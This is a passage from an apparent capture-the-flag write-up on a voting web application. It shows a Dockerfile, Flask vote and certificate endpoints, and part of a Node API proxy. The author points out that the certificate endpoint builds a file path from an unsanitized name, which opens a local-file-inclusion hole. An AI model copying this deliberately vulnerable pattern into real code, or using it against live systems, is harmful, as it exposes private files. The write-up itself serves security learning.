+<span class="line"><span style="color:#FF7B72">RUN</span><span style="color:#E6EDF3"> chmod 777 /app/exports</span></span>
+<span class="line"><span style="color:#FF7B72">RUN</span><span style="color:#E6EDF3"> echo </span><span style="color:#A5D6FF">"ENCRYPTION_KEY=REDACTEDREDACTEDREDACTED"</span><span style="color:#E6EDF3"> > /app/.env</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">USER</span><span style="color:#E6EDF3"> www-data</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">CMD</span><span style="color:#E6EDF3"> [</span><span style="color:#A5D6FF">"python"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"app.py"</span><span style="color:#E6EDF3">]</span></span></code></pre>
+<p>The <code>/vote</code> endpoint will take in the voter’s name and the candidate they are voting. Then the encryption key is constructed using a base key that is stored as an environment variable and a randomly-generated certifier string. The candidate’s name is then encrypted with AES-CBC using the previously made encryption key and stored in the Redis database. The IV of the encryption is stored at the front of the encrypted data.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> generate_random_string</span><span style="color:#E6EDF3">(length</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">8</span><span style="color:#E6EDF3">):</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> ''</span><span style="color:#E6EDF3">.join(secrets.choice(</span><span style="color:#A5D6FF">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> _ </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(length))</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> encrypt_value</span><span style="color:#E6EDF3">(key: </span><span style="color:#79C0FF">bytes</span><span style="color:#E6EDF3">, value: </span><span style="color:#79C0FF">str</span><span style="color:#E6EDF3">) -> </span><span style="color:#79C0FF">str</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">    backend </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> default_backend()</span></span>
+<span class="line"><span style="color:#E6EDF3">    iv </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> secrets.token_bytes(</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    padder </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> padding.PKCS7(</span><span style="color:#79C0FF">128</span><span style="color:#E6EDF3">).padder()</span></span>
+<span class="line"><span style="color:#E6EDF3">    padded_data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> padder.update(value.encode()) </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> padder.finalize()</span></span>
+<span class="line"><span style="color:#E6EDF3">    cipher </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Cipher(algorithms.AES(key), modes.CBC(iv), </span><span style="color:#FFA657">backend</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">backend)</span></span>
+<span class="line"><span style="color:#E6EDF3">    encryptor </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cipher.encryptor()</span></span>
+<span class="line"><span style="color:#E6EDF3">    ct </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> encryptor.update(padded_data) </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> encryptor.finalize()</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> base64.b64encode(iv </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> ct).decode()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D2A8FF">@app.route</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/vote'</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">methods</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">[</span><span style="color:#A5D6FF">'POST'</span><span style="color:#E6EDF3">])</span></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> vote</span><span style="color:#E6EDF3">():</span></span>
+<span class="line"><span style="color:#FF7B72">    try</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">        voter_name </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> request.form.get(</span><span style="color:#A5D6FF">'voter_name'</span><span style="color:#E6EDF3">).strip()</span></span>
+<span class="line"><span style="color:#E6EDF3">        candidate_name </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> request.form.get(</span><span style="color:#A5D6FF">'candidate_name'</span><span style="color:#E6EDF3">).strip()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> voter_name </span><span style="color:#FF7B72">or</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> candidate_name:</span></span>
+<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#E6EDF3"> jsonify({</span><span style="color:#A5D6FF">'error'</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">'Missing voter_name or candidate_name'</span><span style="color:#E6EDF3">}), </span><span style="color:#79C0FF">400</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">        base_key </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> os.getenv(</span><span style="color:#A5D6FF">'ENCRYPTION_KEY'</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> base_key </span><span style="color:#FF7B72">or</span><span style="color:#79C0FF"> len</span><span style="color:#E6EDF3">(base_key) </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> 24</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#E6EDF3"> jsonify({</span><span style="color:#A5D6FF">'error'</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">'Invalid encryption key'</span><span style="color:#E6EDF3">}), </span><span style="color:#79C0FF">500</span></span>
+<span class="line"><span style="color:#E6EDF3">        </span></span>
+<span class="line"><span style="color:#E6EDF3">        r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> redis.Redis(</span><span style="color:#FFA657">unix_socket_path</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">'/redis/redis.sock'</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3"> r.hexists(voter_name, </span><span style="color:#A5D6FF">'voted_for'</span><span style="color:#E6EDF3">):</span></span>
+<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#E6EDF3"> jsonify({</span><span style="color:#A5D6FF">'error'</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">'You have already voted.'</span><span style="color:#E6EDF3">}), </span><span style="color:#79C0FF">403</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">        certifier </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> generate_random_string(</span><span style="color:#79C0FF">8</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        key </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> (certifier </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> base_key).encode()</span></span>
+<span class="line"><span style="color:#E6EDF3">        encrypted_vote </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> encrypt_value(key, candidate_name)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">        r.hset(voter_name, </span><span style="color:#FFA657">mapping</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#A5D6FF">            'name'</span><span style="color:#E6EDF3">: voter_name,</span></span>
+<span class="line"><span style="color:#A5D6FF">            'certifier'</span><span style="color:#E6EDF3">: certifier,</span></span>
+<span class="line"><span style="color:#A5D6FF">            'voted_for'</span><span style="color:#E6EDF3">: encrypted_vote</span></span>
+<span class="line"><span style="color:#E6EDF3">        })</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> jsonify({</span><span style="color:#A5D6FF">'status'</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">'Vote submitted successfully!'</span><span style="color:#E6EDF3">})</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    except</span><span style="color:#79C0FF"> Exception</span><span style="color:#FF7B72"> as</span><span style="color:#E6EDF3"> e:</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> jsonify({</span><span style="color:#A5D6FF">'error'</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">str</span><span style="color:#E6EDF3">(e)}), </span><span style="color:#79C0FF">500</span></span></code></pre>
+<p>The certificate generation is pretty simple, just using Reportlab to generate a PDF using data fetched from the Redis database. The generated certificate will show the name of the voter and the certifier. One interesting thing is that on the <code>/certificate</code> endpoint, the <code>name</code> field is not sanitized at all and it is used as the file name to store the certificate file. Therefore we can leverage this to do a local file inclusion to leak files inside the container.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> generate_random_string</span><span style="color:#E6EDF3">(length</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">8</span><span style="color:#E6EDF3">):</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> ''</span><span style="color:#E6EDF3">.join(secrets.choice(</span><span style="color:#A5D6FF">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> _ </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(length))</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> generate_certificate</span><span style="color:#E6EDF3">(out_path, name, certifier_decoded):</span></span>
+<span class="line"><span style="color:#E6EDF3">    c </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> canvas.Canvas(out_path, </span><span style="color:#FFA657">pagesize</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">landscape(A4))</span></span>
+<span class="line"><span style="color:#E6EDF3">    width, height </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> landscape(A4)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    primary_color </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> colors.HexColor(</span><span style="color:#A5D6FF">"#2563eb"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    light_gray </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> colors.HexColor(</span><span style="color:#A5D6FF">"#f5f5f5"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFillColor(light_gray)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.rect(</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, width, height, </span><span style="color:#FFA657">fill</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFillColor(primary_color)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.rect(</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, height </span><span style="color:#FF7B72">-</span><span style="color:#79C0FF"> 80</span><span style="color:#E6EDF3">, width, </span><span style="color:#79C0FF">80</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">fill</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFont(</span><span style="color:#A5D6FF">"Helvetica-Bold"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">34</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFillColor(colors.white)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.drawCentredString(width </span><span style="color:#FF7B72">/</span><span style="color:#79C0FF"> 2</span><span style="color:#E6EDF3">, height </span><span style="color:#FF7B72">-</span><span style="color:#79C0FF"> 55</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"Thanks for voting!"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    styles </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> getSampleStyleSheet()</span></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle_style </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> styles[</span><span style="color:#A5D6FF">"Normal"</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle_style.fontSize </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 14</span></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle_style.leading </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 18</span></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle_style.textColor </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> colors.black</span></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle_style.alignment </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> TA_CENTER</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle_text </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> (</span></span>
+<span class="line"><span style="color:#A5D6FF">        "This is your official certificate to prove you have voted. "</span></span>
+<span class="line"><span style="color:#A5D6FF">        "If you'd like to verify your vote, please provide the certification code "</span></span>
+<span class="line"><span style="color:#A5D6FF">        "to a trusted official and they will retrieve your vote details."</span></span>
+<span class="line"><span style="color:#E6EDF3">    )</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    subtitle </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Paragraph(subtitle_text, </span><span style="color:#FFA657">style</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">subtitle_style)</span></span>
+<span class="line"><span style="color:#E6EDF3">    frame </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Frame(inch, height </span><span style="color:#FF7B72">-</span><span style="color:#79C0FF"> 200</span><span style="color:#E6EDF3">, width </span><span style="color:#FF7B72">-</span><span style="color:#79C0FF"> 2</span><span style="color:#FF7B72"> *</span><span style="color:#E6EDF3"> inch, </span><span style="color:#79C0FF">80</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">showBoundary</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    frame.addFromList([subtitle], c)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    label_x </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 100</span></span>
+<span class="line"><span style="color:#E6EDF3">    value_x </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 250</span></span>
+<span class="line"><span style="color:#E6EDF3">    start_y </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> height </span><span style="color:#FF7B72">-</span><span style="color:#79C0FF"> 280</span></span>
+<span class="line"><span style="color:#E6EDF3">    line_spacing </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 30</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFillColor(colors.black)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFont(</span><span style="color:#A5D6FF">"Helvetica-Bold"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.drawString(label_x, start_y, </span><span style="color:#A5D6FF">"Voter Name:"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFont(</span><span style="color:#A5D6FF">"Helvetica"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.drawString(value_x, start_y, name)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFont(</span><span style="color:#A5D6FF">"Helvetica-Bold"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.drawString(label_x, start_y </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3"> line_spacing, </span><span style="color:#A5D6FF">"Certification Code:"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFont(</span><span style="color:#A5D6FF">"Helvetica"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.drawString(value_x, start_y </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3"> line_spacing, certifier_decoded)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFont(</span><span style="color:#A5D6FF">"Helvetica-Oblique"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">10</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.setFillColor(colors.gray)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.drawCentredString(width </span><span style="color:#FF7B72">/</span><span style="color:#79C0FF"> 2</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">30</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"This certificate was automatically generated. No signature is required."</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    c.save()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D2A8FF">@app.route</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/certificate'</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">methods</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">[</span><span style="color:#A5D6FF">'POST'</span><span style="color:#E6EDF3">])</span></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> vote_confirm</span><span style="color:#E6EDF3">():</span></span>
+<span class="line"><span style="color:#FF7B72">    try</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">        name </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> request.form.get(</span><span style="color:#A5D6FF">'name'</span><span style="color:#E6EDF3">).strip()</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> name:</span></span>
+<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#E6EDF3"> jsonify({</span><span style="color:#A5D6FF">'error'</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">'Missing name'</span><span style="color:#E6EDF3">}), </span><span style="color:#79C0FF">400</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">        r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> redis.Redis(</span><span style="color:#FFA657">unix_socket_path</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">'/redis/redis.sock'</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        certifier </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> r.hget(name, </span><span style="color:#A5D6FF">'certifier'</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        certifier_decoded </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> certifier.decode() </span><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> certifier </span><span style="color:#FF7B72">else</span><span style="color:#A5D6FF"> 'You have not voted!'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">        out_path </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">'./exports/</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">name</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">        try</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">            generate_certificate(out_path, name, certifier_decoded)</span></span>
+<span class="line"><span style="color:#FF7B72">        except</span><span style="color:#79C0FF"> Exception</span><span style="color:#FF7B72"> as</span><span style="color:#E6EDF3"> e:</span></span>
+<span class="line"><span style="color:#79C0FF">            print</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">'Could not save file, voter </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">name</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF"> has likely already generated confirmation certificate!'</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        </span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> send_file(out_path, </span><span style="color:#FFA657">mimetype</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">'application/pdf'</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">as_attachment</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">False</span><span style="color:#E6EDF3">) </span></span>
+<span class="line"><span style="color:#E6EDF3">    </span></span>
+<span class="line"><span style="color:#FF7B72">    except</span><span style="color:#79C0FF"> Exception</span><span style="color:#FF7B72"> as</span><span style="color:#E6EDF3"> e:</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> {</span><span style="color:#A5D6FF">'error'</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">str</span><span style="color:#E6EDF3">(e)}, </span><span style="color:#79C0FF">500</span></span></code></pre>
+<h4 id="node-service">Node service</h4>
+<p>This service serves the front-end of the application, where the main functionality of the application is for users to cast a vote and generate a certificate to show that they have voted.</p>
+<p><img src="/images/following_protocol/following_protocol_1.png" alt=""></p>
+<p><img src="/images/following_protocol/following_protocol_2.png" alt=""></p>
+<p>This service also serves the <code>/api/*</code> endpoint to expose the internal services on this infrastructure. The service will create an Axios instance that will send a request to <code>http://backend.wbc</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#E6EDF3">app.</span><span style="color:#D2A8FF">any</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/api/*'</span><span style="color:#E6EDF3">, (</span><span style="color:#FFA657">res</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">req</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">=></span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">    let</span><span style="color:#E6EDF3"> isAborted </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> false</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    res.</span><span style="color:#D2A8FF">onAborted</span><span style="color:#E6EDF3">(() </span><span style="color:#FF7B72">=></span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">        isAborted </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> true</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    });</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> method</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> req.</span><span style="color:#D2A8FF">getMethod</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> url</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> req.</span><span style="color:#D2A8FF">getUrl</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">!</span><span style="color:#E6EDF3">url.</span><span style="color:#D2A8FF">startsWith</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/api/'</span><span style="color:#E6EDF3">)) {</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> res.</span><span style="color:#D2A8FF">writeStatus</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'400 Bad Request'</span><span style="color:#E6EDF3">).</span><span style="color:#D2A8FF">end</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'Invalid request.'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> remainder</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> url.</span><span style="color:#D2A8FF">slice</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">5</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> api</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> [</span><span style="color:#A5D6FF">'v1'</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">'v2'</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">'img'</span><span style="color:#E6EDF3">].</span><span style="color:#D2A8FF">includes</span><span style="color:#E6EDF3">(remainder.</span><span style="color:#D2A8FF">split</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/'</span><span style="color:#E6EDF3">)[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">]) </span><span style="color:#FF7B72">?</span><span style="color:#E6EDF3"> remainder.</span><span style="color:#D2A8FF">split</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/'</span><span style="color:#E6EDF3">)[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> 'v2'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> path</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> remainder.</span><span style="color:#D2A8FF">slice</span><span style="color:#E6EDF3">(remainder.</span><span style="color:#D2A8FF">indexOf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'/'</span><span style="color:#E6EDF3">)</span><span style="color:#FF7B72">+</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> client</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> axios.</span><span style="color:#D2A8FF">create</span><span style="color:#E6EDF3">({baseURL: </span><span style="color:#A5D6FF">`http://backend.wbc/${</span><span style="color:#E6EDF3">api</span><span style="color:#A5D6FF">}/`</span><span style="color:#E6EDF3">, allowAbsoluteUrls: </span><span style="color:#79C0FF">false</span><span style="color:#E6EDF3">});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    let</span><span style="color:#E6EDF3"> body </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> []</span></span>
+<span class="line"><span style="color:#E6EDF3">    res.</span><span style="color:#D2A8FF">onData</span><span style="color:#E6EDF3">((</span><span style="color:#FFA657">chunk</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">isLast</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">=></span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">        body.</span><span style="color:#D2A8FF">push</span><span style="color:#E6EDF3">(Buffer.</span><span style="color:#D2A8FF">from</span><span style="color:#E6EDF3">(chunk))</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3">(isLast) {</span></span>
+<span class="line"><span style="color:#FF7B72">            const</span><span style="color:#79C0FF"> fullBody</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> Buffer.</span><span style="color:#D2A8FF">concat</span><span style="color:#E6EDF3">(body).</span><span style="color:#D2A8FF">toString</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#E6EDF3">            client.</span><span style="color:#D2A8FF">request</span><span style="color:#E6EDF3">(path, {method: method, data: fullBody}).</span><span style="color:#D2A8FF">then</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">response</span><span style="color:#FF7B72"> =></span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">                if</span><span style="color:#E6EDF3"> (isAborted) </span><span style="color:#FF7B72">return</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">                res.</span><span style="color:#D2A8FF">cork</span><span style="color:#E6EDF3">(() </span><span style="color:#FF7B72">=></span><span style="color:#E6EDF3"> {</span></span>
